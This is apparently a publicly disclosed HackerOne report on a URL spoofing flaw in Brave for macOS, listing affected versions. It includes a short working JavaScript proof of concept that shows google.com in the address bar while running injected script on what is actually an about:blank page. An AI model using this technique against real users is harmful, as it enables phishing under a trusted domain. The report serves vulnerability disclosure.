# URL spoofing in Brave for macOS

## Report Details
- **Report ID**: 369086
- **URL**: https://hackerone.com/reports/369086
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-06-20T04:53:57.770Z
- **Disclosed**: 2018-10-04T00:50:38.097Z

## Reporter
- **Username**: metnew
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
## Summary:
URL spoofing vulnerability.

## Repro

```
<script>
    window.onclick = function () {
        x = window.open('https://www.google.com/csi');
        setTimeout(function () {
            x.document.write(`I am not a www.google.com;<button onclick="alert('I can run JS on this page!')">click me</button>`)
        }, 100);
    }
</script>
```

URL in address bar is `https://www.google.com/csi`, but actually that's about:blank page.
Attacker could inject arbitrary content and execute javascript on this page.
Additionally, during alert(), address bar continue displaying `www.google.com`


## Products affected: 

Brave	0.22.810
V8	6.7.288.43
rev	8f30eeb
Muon	7.0.6
OS Release	17.6.0
Update Channel	Release
OS Architecture	x64
OS Platform	macOS
Node.js	7.9.0
Brave Sync	v1.4.2
libchromiumcontent	67.0.3396.71
OS: macOS 10.13.5 17F77 x86_64

## Impact

Typical URL spoofing vulnerability impact. Could be explained, if required.

## Attachments
No attachments
